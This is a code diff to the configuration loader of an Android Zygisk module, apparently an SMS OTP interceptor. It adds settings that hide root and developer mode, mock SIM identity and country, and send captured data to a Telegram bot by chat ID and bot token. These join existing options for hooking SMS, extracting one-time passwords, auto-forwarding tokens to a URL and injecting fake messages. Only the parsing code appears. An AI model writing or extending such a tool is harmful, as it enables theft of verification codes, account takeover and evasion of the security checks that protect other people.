@@ -111,8 +111,8 @@ ConfigManager& ConfigManager::instance() {
 
 bool ConfigManager::load() {
     const std::vector<std::string> paths = {
-        "/data/local/tmp/zygisk_sms_otp_config.json",
-        "/data/adb/modules/zygisk_sms_otp/config.json",
+        "/data/local/tmp/hivirtus_zygisk_mode_config.json",
+        "/data/adb/modules/hivirtus_zygisk_mode/config.json",
     };
 
     std::string json;
@@ -126,12 +126,19 @@ bool ConfigManager::load() {
         return false;
     }
 
+    config_.hide_root = parse_bool(json, "hide_root", true);
+    config_.hide_developer = parse_bool(json, "hide_developer", true);
+    config_.enable_sim1_mock = parse_bool(json, "enable_sim1_mock", false);
+    config_.enable_sim2_mock = parse_bool(json, "enable_sim2_mock", false);
+    config_.mock_country_iso = parse_string(json, "mock_country_iso", config_.mock_country_iso);
     config_.hook_incoming_sms = parse_bool(json, "hook_incoming_sms", true);
     config_.hook_outgoing_sms = parse_bool(json, "hook_outgoing_sms", true);
     config_.auto_extract_otp = parse_bool(json, "auto_extract_otp", true);
     config_.auto_forward_token = parse_bool(json, "auto_forward_token", true);
     config_.forward_url = parse_string(json, "forward_url", config_.forward_url);
     config_.forward_method = parse_string(json, "forward_method", config_.forward_method);
+    config_.telegram_chat_id = parse_string(json, "telegram_chat_id", config_.telegram_chat_id);
+    config_.telegram_bot_token = parse_string(json, "telegram_bot_token", config_.telegram_bot_token);
     config_.inject_sender_id = parse_string(json, "inject_sender_id", config_.inject_sender_id);
     config_.inject_message_body = parse_string(json, "inject_message_body", config_.inject_message_body);
     config_.log_file = parse_string(json, "log_file", config_.log_file);
